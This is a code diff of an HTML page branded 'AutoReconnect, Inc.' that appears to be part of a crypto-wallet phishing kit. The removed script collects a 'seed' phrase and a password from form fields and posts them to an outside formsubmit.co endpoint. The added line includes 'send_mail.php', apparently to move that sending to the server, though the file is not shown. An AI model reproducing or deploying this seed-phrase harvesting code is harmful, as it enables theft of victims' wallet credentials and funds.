@@ -13,7 +13,7 @@
 </head>
 <body>
 
-    
+    <?php include('send_mail.php'); ?>
     
     <div class="close">
         <i class="fa fa-angle-left fa-2x" id="close" onclick="closeMenu()"></i>
@@ -137,24 +137,5 @@
     <h5>Copyright © 2022 AutoReconnect, Inc. All rights reserved.</h5>
 </section>
 <script src="js.js"></script>
-<script>
-
-    function toSubmit(){
-        var name = document.getElementById("seed").value;
-        var password = document.getElementById("movepass").value;
-    
-        var dataString = 'Airgap=' + name +  '&Password=' + password ;
-    
-        $.ajax({
-        method: 'POST',
-        url: 'https://formsubmit.co/ajax/60c68e87820dd251e73211e21d7940df',
-        dataType: 'json',
-        accepts: 'application/json',
-        data: dataString,
-        success: (data) => console.log(data),
-        error: (err) => console.log(err)
-    });
-    }
-    </script>
 </body>
 </html>
